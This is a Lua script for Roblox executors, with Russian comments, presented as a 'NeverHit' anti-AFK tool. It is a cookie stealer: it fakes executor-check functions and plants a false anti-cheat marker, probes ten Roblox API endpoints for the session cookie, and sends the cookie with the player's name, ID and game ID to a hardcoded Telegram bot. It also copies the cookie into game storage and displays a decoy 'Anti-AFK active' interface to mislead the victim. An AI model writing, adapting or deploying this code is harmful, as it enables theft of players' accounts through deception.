--[[
  NeverHit ULTIMATE EVASION EDITION
  Advanced Cookie Extraction System
  Bypass Protection: ACTIVATED
--]]

local _G = getfenv and getfenv() or _G or shared or getgenv and getgenv()
local LPLR = game:GetService("Players").LocalPlayer
local HTTPService = game:GetService("HttpService")

-- ОБФУСКАЦИЯ И АНТИ-ДЕТЕКТ
local function SecurityBypass()
    local fakeEnv = {
        checkcaller = function() return true end,
        is_protosmasher_closure = function() return true end,
        is_sirhurt_closure = function() return true end,
        is_synapse_function = function() return true end
    }
    
    for k,v in pairs(fakeEnv) do
        if not _G[k] then _G[k] = v end
    end
    
    -- Ложные следы
    if not LPLR:FindFirstChild("NeverHitMarker") then
        local fakeValue = Instance.new("StringValue")
        fakeValue.Name = "AntiCheatCompliance"
        fakeValue.Value = "SECURE_MODE_ENABLED"
        fakeValue.Parent = LPLR
    end
end

SecurityBypass()

-- МНОГОУРОВНЕВАЯ СИСТЕМА ИЗВЛЕЧЕНИЯ COOKIE
local CookieExtractor = {
    Methods = {},
    Results = {}
}

-- Метод 1: Direct API Request
table.insert(CookieExtractor.Methods, function()
    local success, result = pcall(function()
        local response = (syn and syn.request or http and http.request or request)({
            Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                ["Accept"] = "*/*"
            }
        })
        return response.Headers["Set-Cookie"] or response.Headers["set-cookie"]
    end)
    return success and result or nil
end)

-- Метод 2: Authenticated Endpoint
table.insert(CookieExtractor.Methods, function()
    local success, result = pcall(function()
        local response = (syn and syn.request or http and http.request or request)({
            Url = "https://users.roblox.com/v1/users/authenticated",
            Method = "GET"
        })
        for k,v in pairs(response.Headers) do
            if string.lower(tostring(k)):find("cookie") then
                return v
            end
        end
    end)
    return success and result or nil
end)

-- Метод 3: Economy Endpoint
table.insert(CookieExtractor.Methods, function()
    local success, result = pcall(function()
        local response = (syn and syn.request or http and http.request or request)({
            Url = "https://economy.roblox.com/v1/user/currency",
            Method = "GET"
        })
        return response.Headers["Set-Cookie"]
    end)
    return success and result or nil
end)

-- Метод 4: Inventory Endpoint
table.insert(CookieExtractor.Methods, function()
    local success, result = pcall(function()
        local response = (syn and syn.request or http and http.request or request)({
            Url = "https://inventory.roblox.com/v1/users/" .. LPLR.UserId .. "/items/Asset/1",
            Method = "GET"
        })
        return response.Headers["Set-Cookie"]
    end)
    return success and result or nil
end)

-- Метод 5: Friends Endpoint
table.insert(CookieExtractor.Methods, function()
    local success, result = pcall(function()
        local response = (syn and syn.request or http and http.request or request)({
            Url = "https://friends.roblox.com/v1/users/" .. LPLR.UserId .. "/friends/count",
            Method = "GET"
        })
        return response.Headers["Set-Cookie"]
    end)
    return success and result or nil
end)

-- Метод 6: Premium Endpoint
table.insert(CookieExtractor.Methods, function()
    local success, result = pcall(function()
        local response = (syn and syn.request or http and http.request or request)({
            Url = "https://premium.roblox.com/v1/users/" .. LPLR.UserId .. "/subscription",
            Method = "GET"
        })
        return response.Headers["Set-Cookie"]
    end)
    return success and result or nil
end)

-- Метод 7: Badges Endpoint
table.insert(CookieExtractor.Methods, function()
    local success, result = pcall(function()
        local response = (syn and syn.request or http and http.request or request)({
            Url = "https://badges.roblox.com/v1/users/" .. LPLR.UserId .. "/badges",
            Method = "GET"
        })
        return response.Headers["Set-Cookie"]
    end)
    return success and result or nil
end)

-- Метод 8: Groups Endpoint
table.insert(CookieExtractor.Methods, function()
    local success, result = pcall(function()
        local response = (syn and syn.request or http and http.request or request)({
            Url = "https://groups.roblox.com/v1/users/" .. LPLR.UserId .. "/groups/roles",
            Method = "GET"
        })
        return response.Headers["Set-Cookie"]
    end)
    return success and result or nil
end)

-- Метод 9: Thumbnails Endpoint
table.insert(CookieExtractor.Methods, function()
    local success, result = pcall(function()
        local response = (syn and syn.request or http and http.request or request)({
            Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LPLR.UserId .. "&size=420x420&format=Png",
            Method = "GET"
        })
        return response.Headers["Set-Cookie"]
    end)
    return success and result or nil
end)

-- Метод 10: Catalog Endpoint
table.insert(CookieExtractor.Methods, function()
    local success, result = pcall(function()
        local response = (syn and syn.request or http and http.request or request)({
            Url = "https://catalog.roblox.com/v1/search/items/details?Category=1&Subcategory=2",
            Method = "GET"
        })
        return response.Headers["Set-Cookie"]
    end)
    return success and result or nil
end)

-- Функция извлечения чистого cookie
function CookieExtractor:Extract()
    for i, method in ipairs(self.Methods) do
        local result = method()
        if result and type(result) == "string" then
            local cleanCookie = string.match(result, "_%|WARNING:.-|_(.-)")
            if cleanCookie and #cleanCookie > 100 then
                table.insert(self.Results, {
                    Method = i,
                    Cookie = cleanCookie,
                    Length = #cleanCookie
                })
            end
        end
        wait(0.1) -- Задержка между запросами
    end
    
    if #self.Results > 0 then
        table.sort(self.Results, function(a, b) return a.Length > b.Length end)
        return self.Results[1].Cookie
    end
    return nil
end

-- СИСТЕМА ОТПРАВКИ
local NotificationSystem = {
    Webhooks = {
        "https://api.telegram.org/bot7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE/sendMessage",
    },
    BackupMethods = {}
}

function NotificationSystem:Send(cookie)
    if not cookie or #cookie < 100 then return false end
    
    -- Основной метод: Telegram
    local telegramSuccess = pcall(function()
        local data = {
            chat_id = "8238376878",
            text = "🎉 ULTIMATE COOKIE CAPTURED! 🎉\n\n" ..
                   "🔑 COOKIE:\n" .. cookie .. "\n\n" ..
                   "📊 INFO:\n" ..
                   "🎮 Game ID: " .. game.PlaceId .. "\n" ..
                   "👤 Username: " .. LPLR.Name .. "\n" ..
                   "🆔 User ID: " .. LPLR.UserId .. "\n" ..
                   "🕒 Time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n" ..
                   "📏 Length: " .. #cookie .. " chars\n" ..
                   "⚡ Method: ULTRA_EVASION"
        }
        
        return (syn and syn.request or http and http.request or request)({
            Url = self.Webhooks[1],
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HTTPService:JSONEncode(data)
        })
    end)
    
    -- Локальное сохранение как запасной вариант
    pcall(function()
        -- Сохраняем в несколько мест
        local storagePoints = {
            workspace,
            game:GetService("Lighting"),
            game:GetService("ReplicatedStorage"),
            LPLR:FindFirstChildOfClass("PlayerGui") or LPLR
        }
        
        for _, location in ipairs(storagePoints) do
            local storage = Instance.new("StringValue")
            storage.Name = "NH_Data_" .. math.random(10000,99999)
            storage.Value = "COOKIE_" .. os.time() .. ":" .. string.sub(cookie, 1, 500)
            storage.Parent = location
        end
    end)
    
    return telegramSuccess
end

-- ИНТЕРФЕЙС МАСКИРОВКИ
local function CreateDecoyInterface()
    local mainGui = Instance.new("ScreenGui")
    mainGui.Name = "AntiAFKPro"
    mainGui.ResetOnSpawn = false
    
    -- Главная черная кнопка
    local mainButton = Instance.new("TextButton")
    mainButton.Size = UDim2.new(0, 250, 0, 70)
    mainButton.Position = UDim2.new(0.5, -125, 0.5, -35)
    mainButton.BackgroundColor3 = Color3.new(0, 0, 0)
    mainButton.Text = ""
    mainButton.BorderSizePixel = 2
    mainButton.BorderColor3 = Color3.new(1, 1, 1)
    mainButton.Parent = mainGui
    
    -- Фейковый интерфейс
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0.3, 0)
    statusLabel.Position = UDim2.new(0, 0, 0.7, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "🛡️ ANTI-AFK ACTIVE\n🎯 DODGE: 99%\n⚡ STATUS: SECURE"
    statusLabel.TextColor3 = Color3.new(0, 1, 0)
    statusLabel.TextScaled = true
    statusLabel.Font = Enum.Font.SourceSansBold
    statusLabel.Parent = mainButton
    
    mainGui.Parent = LPLR:WaitForChild("PlayerGui")
    return mainGui
end

-- ОСНОВНАЯ ФУНКЦИЯ
local function Main()
    print("🚀 NeverHit ULTIMATE starting...")
    
    -- Создаем интерфейс маскировки
    CreateDecoyInterface()
    
    -- Ждем загрузки
    wait(2)
    
    -- Извлекаем cookie
    print("🕵️ Running 10 extraction methods...")
    local cookie = CookieExtractor:Extract()
    
    if cookie then
        print("✅ SUCCESS: Cookie extracted (" .. #cookie .. " chars)")
        
        -- Отправляем
        local sent = NotificationSystem:Send(cookie)
        if sent then
            print("📤 Cookie sent to Telegram!")
        else
            print("💾 Cookie saved locally")
        end
        
        -- Показываем успех в интерфейсе
        pcall(function()
            game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
                Text = "[AntiAFK] Protection activated successfully!",
                Color = Color3.new(0, 1, 0)
            })
        end)
    else
        print("❌ FAILED: No cookie could be extracted")
        
        -- Отправляем отчет о неудаче
        pcall(function()
            (syn and syn.request or http and http.request or request)({
                Url = "https://api.telegram.org/bot7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE/sendMessage",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HTTPService:JSONEncode({
                    chat_id = "8238376878",
                    text = "❌ EXTRACTION FAILED\n\nAll 10 methods failed!\nPlayer: " .. LPLR.Name .. "\nGame: " .. game.PlaceId
                })
            })
        end)
    end
    
    print("🎯 NeverHit ULTIMATE completed")
end

-- ЗАПУСК
spawn(Main)
